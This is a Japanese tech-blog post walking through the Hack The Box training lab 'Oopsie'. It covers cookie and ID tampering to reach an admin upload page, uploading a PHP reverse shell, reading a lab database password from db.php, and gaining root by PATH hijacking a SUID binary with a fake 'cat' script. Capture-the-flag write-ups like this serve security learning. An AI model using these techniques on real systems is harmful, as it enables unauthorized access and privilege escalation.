---
title: "Hack The Box Oopsie を解いてみた"
date: 2023/04/25 00:00:00
postid: a
tag:
  - HackTheBox
  - 競技プログラミング
category:
  - Security
thumbnail: /images/20230425a/thumbnail.png
author: 藤戸四恩
lede: "Hack The BoxのStarting PointのTIER2のOopsieを解いてみました。"
---

## はじめに

金融グループ所属、2022年4月入社の藤戸四恩です。[春の入門ブログ連載](/articles/20230417a/)の7本目です。

2022年のアドベントカレンダーで[Hack The Boxのstarting pointを解いてみた](https://qiita.com/fujito_shion/items/6a4475fc8784d2e77d4c)の記事を書きました。今回も「Hack The Box」のStarting PointのTIER2のOopsieを解いてみたので感想を書きたいと思います。

## Hack The Boxとは

Hack The Boxとは、サイバーセキュリティスキルの向上トレーニングができるオンラインプラットフォームです。

仮想の環境が用意されており、脆弱性をついてflagの取得を目的としています。

## Starting Pointとは

Starting Pointとは、Hack The Boxを行う上での基礎的なことを学ぶことができる、チュートリアルです。Starting Pointには、TIER0、TIER1、TIER2の3つあります。各問題にTASKが複数あり、最後にflagを取るための誘導になっています。

## Oopsie

TIER2の問題から`root.txt`と`user.txt`の二つフラグを取得する必要があります。

問題はTASK1 ~ TASK10と`root.txt`と`user.txt`の中身を提出する12問から構成されています。

### TASK1

```text
With what kind of tool can intercept web traffic?
```

どのようなツールでWebトラフィックを傍受できるか?　と問われています。
こちらは、`proxy`と回答すればよいです。

### TASK2

```text
What is the path to the directory on the webserver that returns a login page?
```

ログインページを返す Web サーバー上のディレクトリへのパスは何ですか?　と問われています。

`http://{IPアドレス}` にアクセスしBurp Suiteを使用しながらリクエストを眺めます。

内容は下図のようになります。

<img src="/images/20230425a/image.png" alt="" width="1200" height="526" loading="lazy">

`cdn-cgi/login` ディレクトリが存在しているのがわかるので、`http://{IPアドレス}/cdn-cgi/login` にアクセスしてみます。

<img src="/images/20230425a/image_2.png" alt="" width="1200" height="889" loading="lazy">

Loginページを見つけることができました。

よって、`cdn-cgi/login`と回答すればよいです。

### TASK3, 4

TASK3の問題

```text
What can be modified in Firefox to get access to the upload page?
```

TASK４の問題

```text
What is the access ID of the admin user?`
```

TASK3は、アップロードページにアクセスするには、Firefoxで何を変更できますか?と問われており、TASK４は、admin ユーザーのアクセスIDを問われています。TASK2のログインページでLogin as Guestのリンクがあるのでクリックしてみます。

<img src="/images/20230425a/image_3.png" alt="" width="1200" height="690" loading="lazy">

ヘッダーのAccountをクリックしてみます。
<img src="/images/20230425a/image_4.png" alt="" width="1200" height="690" loading="lazy">

URLが`http://{IPアドレス}/cdn-cgi/login/admin.php?content=accounts&id=2`とguestの時idが2となっています。そこでid=1にしてURLを叩いてみます。

<img src="/images/20230425a/image_5.png" alt="" width="1200" height="686" loading="lazy">

adminユーザのIDがわかりました。

よって、TASK3の回答が`cookie`で、TASK4の回答が`34322`となります。

### TASK5

```text
On uploading a file, what directory does that file appear in on the server?
```

ファイルをアップロードすると、そのファイルはサーバー上のどのディレクトリに表示されますか?と問われています。

TASK3,4でadminユーザはID34322と分かったので、cookieのuserを34322、roleをadminに変更し、uploadsをクリックします。

<img src="/images/20230425a/image_6.png" alt="" width="1200" height="743" loading="lazy">

ファイルをアップロードすると`The file {ファイル名} has been uploaded.`と表示されます。

gobusterをつかって、探索してみます。

<img src="/images/20230425a/image_7.png" alt="" width="751" height="410" loading="lazy">

`uploads`がありました。よって、回答は`uploads`です。また、ファイルをアップロードすると`uploads`配下にファイルが格納されそうと推測できます。

### TASK6

```text
What is the file that contains the password that is shared with the robert user?
```

robert ユーザーと共有されているパスワードを含むファイルは何ですか?と問われています。

実際にアクセスしてみます。

<img src="/images/20230425a/image_8.png" alt="image.png" width="751" height="410" loading="lazy">

権限がないと怒られます。

[php-reverse-shell](https://github.com/BlackArch/webshells)をファイルアップロードして、reverse-shellを試みます。

<img src="/images/20230425a/image_9.png" alt="" width="908" height="138" loading="lazy">

lsコマンドで色々探してると、`/var/www/html/cdn-cgi/login`配下にdb.phpファイルが存在します。
db.phpファイルをcatしてみます。

```sh
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

mysqlへの接続情報が記載されています。よって、設問の解答は`db.php`になります。

### TASK7

```text
What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
```

bugtrackerグループが所有するすべてのファイルを特定するために、オプション "-group bugtracker" を付けて実行される実行ファイルは何か？ と問われています。

whoamiコマンドを実行すると `www-data`と表示されます。

```sh
$ whoami
www-data
```

robertに切り替えたいと考えたのですが、ここで詰まってしまい、walkthroughを確認してしまいました。

* Hack The Box は Starting Pointの問題は、walkthroughという回答が用意されています。

<img src="/images/20230425a/image_10.png" alt="" width="725" height="105" loading="lazy">

walkthroughを確認すると、どうやらPythonの実行環境があるらしいので、上図のように実行します。

※なぜptyをimportしているかはこちらの記事が参考になりました。[^1]

robertにユーザを変更します。

```sh
$ su robert
```

パスワードはmysqlの接続情報に記載されていた`M3g4C0rpUs3r!`を入力するとユーザを切り替えすることができました。
bugtrackerに属するファイルを探します。

```shell
$ find / -group bugtracker 2>/dev/null
> /usr/bin/bugtracker
```

何やら怪しげなファイルがありました。設問の回答としては、`find`です。

### TASK8

```text
Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
```

どのユーザーがbugtracker実行ファイルを実行し始めたかに関わらず、実行するために使用するユーザー権限は何ですか？と問われています。こちらの回答は`root`になります。

### TASK9

```text
What SUID stands for?
```

SUIDは何を表すかを問われています。SUIDについて知らなかったため調べてみました。[^2]

SUIDとは、Set owner User IDの略で、セットしたUserIDでファイルが実行されるそうです。

よって回答としては、`Set owner User ID`になります。

### TASK10

```text
What is the name of the executable being called in an insecure manner?
```

安全でない方法で呼び出されている実行ファイルの名前は何ですか？と問われています。

TASK7でbugtracker　グループに属しているファイルを実行してみます。

```sh
$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: hoge
---------------

cat: /root/reports/hoge: No such file or directory
```

実行するとidを聞かれ、hogeと入力すると出力結果には、`cat: /root/reports/hoge: No such file or directory` と表示されていることがわかります。

つまり、このファイルは `/root/reports/` 入力値のファイルを `cat` していることがわかります。

設問の解答としては、`cat`になります。

### user.txtの取得

`user.txt` は既に `/home/robert/` 配下に存在しているのでその中身を取得すればよいです。

### root.txtの取得

`/usr/bin/bugtrancker` は `root` ユーザとして実行される。
`cat` を自分の作成したファイルを呼び出したい。
そこで、 `/tmp` 配下に `cat` ファイルを作成し、

```sh
cd /tmp
touch cat
chmod +x cat
```

また、 `cat` ファイルの中身に `/bin/bash` を書き込みます。

```sh
echo "/bin/bash" > cat
export PATH="/tmp:$PATH"
```

これにより、`/usr/bin/bugtracker`を実行し、 `whoami` を実行すると `root` ユーザでシェルが立ち上がっているのが確認できます。

<img src="/images/20230425a/image_11.png" alt="" width="338" height="197" loading="lazy">

あとは `/root` 配下のフラグを提出すれば完了です。

## まとめ

今回は権限昇格がポイントでした。

権限昇格の部分で非常に詰まりました。

TIER2以降では権限昇格は必要な知識なので、しっかり使えるようになることが大切だと感じました。

明日の記事は、渡邉さんの[Pulumiで始めるIaC入門](/articles/20230426a/)です。

[^1]: https://qiita.com/kasei-san/items/3edb52359ff288d2f435
[^2]: https://eng-entrance.com/linux-permission-suid
